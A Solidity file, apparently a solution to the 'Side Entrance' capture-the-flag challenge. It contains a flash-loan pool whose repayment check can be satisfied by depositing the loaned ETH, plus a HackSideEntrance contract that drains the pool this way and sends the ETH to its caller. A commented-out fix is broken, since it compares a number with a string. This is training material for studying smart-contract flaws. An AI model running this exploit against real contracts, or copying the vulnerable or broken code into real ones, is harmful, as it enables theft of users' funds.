pragma solidity ^0.6.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    using Address for address payable;

    mapping (address => uint256) private balances;
    address[] public users;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        users.push(msg.sender);
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        msg.sender.sendValue(amountToWithdraw);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        // SOLUTION
       /*  uint usersBalance;
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            usersBalance += balances[user];
        }
        uint totalBalance = address(this).balance + usersBalance;
        require(totalBalance == ("contract balance + users"), "Flash loan hasn't been paid back");     */
            
        require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back");        
    }
}
 
contract HackSideEntrance{
    
    // address public poolAddress;
    SideEntranceLenderPool public pool;
    
    fallback () external payable{}
    
    constructor (address _pool) public{
        // poolAddress = _pool;
        pool = SideEntranceLenderPool(_pool);
    }
    
    function attack() external{
        
        pool.flashLoan(address(pool).balance);
        pool.withdraw();
        msg.sender.transfer(address(this).balance);
    }
    
    function execute() external payable{
        
        pool.deposit{value: msg.value}();
        // pool.send{value: msg.value}();

    }
} 